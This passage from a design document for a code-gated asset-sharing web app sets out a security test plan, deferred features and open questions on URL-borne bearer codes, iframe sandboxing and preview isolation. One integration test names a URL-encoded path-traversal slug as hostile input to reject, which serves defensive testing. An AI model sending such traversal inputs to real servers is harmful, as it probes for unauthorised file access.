6. `new-asset` generator + **generator registry**; build step (manifest to non-served path,
   fixed-length-slug/dup/registry checks, advisory external-origin scan).
7. Headers, robots.txt, CSP; rate limiter with **valid-cookie exemption + bucketed unknown slugs**.
8. Preview/prod DB + secret isolation (**schema-only preview DB**, **`/a/*` gated on preview**);
   secret **key rings** for rotation; migration release step.

## 13. Testing & error handling

- **Unit:** code validity (valid / expired / revoked / wrong-slug); 90-day default expiry;
  128-bit code + 22-char slug generation; asset-cookie sign/verify + payload binding (reject
  cross-asset replay, reject past-expiry, reject unknown `v`/`kid` and non-canonical/extra-field
  payloads; **verify still accepts a cookie signed with the previous `kid` during the rotation
  window but rejects one signed with a *retired* key** — key ring, §6/§10); TOTP verify (±1 window)
  **and replay rejection via `totp_used_steps`** (second use of the same step is rejected).
- **Integration:** valid code → 302 → clean URL → 200 + HTML; **redemption precedence** (a
  present `?code=` overrides an existing cookie); **failure-vs-failure parity** (unknown slug and
  wrong code return byte-identical 200 body/headers); revoked code denied on next load (instant
  revoke); **DB unavailable during a cookie load → denied** (fail-closed), not served from cookie;
  `/admin/*` redirects to login without a session and is **inert on preview** (`VERCEL_ENV` gate);
  login rejects wrong password **or** wrong TOTP; admin mutation without valid Origin rejected
  (CSRF); **a malformed/traversal slug** (e.g. `..%2f..`, non-22-char) is rejected by the runtime
  shape check before any DB/FS access; **an expired cookie (TTL lapsed) with no `?code=`** returns the
  **byte-identical generic failure page** (parity holds — no per-cookie branch, §6 step 5), and
  re-opening the original link re-redeems; **redemption is atomic (one conditional `UPDATE`, no
  separate check-then-write)** — under a concurrent revoke, either the redeeming `UPDATE` wins (row
  returned → cookie issued) or the revoke wins (no row → failure); there is no interleaving that
  increments `use_count` without issuing access or vice-versa; **rate limiter
  trips and then recovers** after the window, and a **valid-cookie load is exempt** from the `/a/*`
  limiter; **spraying random slugs does not create unbounded `rate_limits` rows** (bucketed);
  **concurrent redemptions** increment `use_count` correctly (atomic update, no lost updates); the
  manifest is **not routable** (`/assets/manifest.json`, `/a/manifest.json`, `/a/<slug>/manifest.json`
  all 404).
- **Header/cookie coverage:** assert **every** security header — `Cache-Control: no-store`,
  `Referrer-Policy: no-referrer`, `X-Robots-Tag`, `X-Content-Type-Options`, full CSP incl.
  `frame-ancestors 'none'`, HSTS — on redemption/asset/failure/admin responses; assert asset-cookie
  attributes (`HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/a/<slug>`) and that the post-redirect
  clean URL carries **no `?code=`**.
- **Security-property:** redemption looks up by `SHA-256(code)` and the raw code is never persisted
  (assert no plaintext code column); admin password verifies via argon2id (reject a fast-hash impl);
  a **wrong password with a valid TOTP does not consume the TOTP step** (§5/§8); **`/a/*` is gated on
  preview** (`VERCEL_ENV` — serves generic page or requires the preview secret, per §10).
- **Build:** manifest generated to the non-served path (and *not* under `assets/`); duplicate-slug
  fails build; slug not matching `^[A-Za-z0-9_-]{22}$` fails build; **slug absent from the generator
  registry fails build** (D2 backstop); missing `<title>` falls back to slug; external-origin
  references are caught across `srcset`, CSS `@import`/`url()`, SVG `<use>`, and `<meta refresh>`
  (advisory scan, §7).
- **Error handling:** a valid code whose asset file is missing still returns the *same* generic
  page to the recipient (no distinction leaks) **but logs/alerts a high-severity server error** with
  slug + `code_id` — a valid code with no file is an integrity failure (bad deploy / deleted asset),
  not a normal 404, and must page someone. Admin shows clear, rate-limited errors for bad
  credentials.
- **Deploy verification:** the §12 bundling spike is validated on a real deploy, not just
  `vercel dev`.

## 14. Explicitly out of scope (YAGNI)

- User accounts / multi-admin.
- One-time-view or device/IP-locked codes (declined in favor of reusable links).
- Sidecar/multi-file assets **now** (layout and CSP are forward-compatible, but not built yet).
- A separate access-audit log table beyond `last_used_at` / `use_count` (note: `use_count` counts
  redemptions, not distinct viewers — don't over-trust it).
- **Sandboxed-iframe asset rendering** — the structural mitigation for the top-level-navigation
  exfiltration residual (§3/§9). Still deferred, but **promoted to a recommended reconsideration in
  §15** because the "trusted admin" justification only covers malice, not authoring mistakes.

## 15. Open design questions (owner decisions — surfaced, not silently resolved)

These are places where a security review pushed on an *accepted* tradeoff hard enough that the owner
should consciously re-affirm or change the decision. The current design still stands as written
above; each item records the tension and the concrete alternative.

1. **Reusable bearer code in the URL (§3 D1/D4).** The one-click model puts a *reusable* code in the
   query string, exposing it to logs, browser history/sync, link scanners, unfurlers, and proxies —
   the single largest residual. Two alternatives keep one-click UX while removing the reusable code
   from the URL:
   - **Short-lived one-time redemption token.** The emailed link carries a single-use, short-TTL
     token; first click exchanges it for the durable `asset_access_<slug>` cookie and the token is
     immediately invalidated. Removes the reusable code from the URL entirely. **Cost:** re-clicking
     the *same* link after the cookie lapses no longer works, which conflicts with the reusable-link
     decision (§2) — you'd need a per-recipient "resend link" flow in the admin panel.
   - **Fragment + same-origin POST.** Link is `/a/<slug>#code=XXX`; a tiny same-origin script reads
     the fragment and POSTs it to redeem. The fragment is **not** sent to servers (no platform-log /
     Referer leak) — but it *is* still in browser history, and this adds a JS dependency (breaks the
     no-JS property). Narrower win than the token approach.
   - **Decision needed:** keep query-string (simplest, fully reusable, accept D4) vs. adopt one of
     the above. Recommend at least the fragment approach if platform-log leakage is a real concern.
2. **Sandboxed-iframe rendering (§3/§9/§14).** Rendering each asset in a sandboxed iframe *without*
   `allow-top-navigation` closes the top-level-navigation exfiltration residual that CSP cannot. The
   design defers it as YAGNI under "trusted admin," but an accidental top-frame navigation or a
   copied third-party snippet would exfiltrate the whole document. **Recommendation:** build the
   sandboxed-iframe render now (or before onboarding any asset the admin didn't hand-write
   end-to-end); keep the access cookie scoped to the parent route, not the iframe's execution context.
3. **How to gate `/a/*` on preview (§10/§11).** Preview builds bundle confidential asset HTML and
   serve `/a/*`. Choose explicitly: (a) return the generic page for `/a/*` on preview and do QA in
   `vercel dev`/local; (b) protect preview with a cheap preview-only shared secret; or (c) accept
   the exposure but never publish sensitive assets through publicly-reachable PR previews. Regardless
   of choice, the preview Neon DB must be **schema-only, never branched from prod data**.
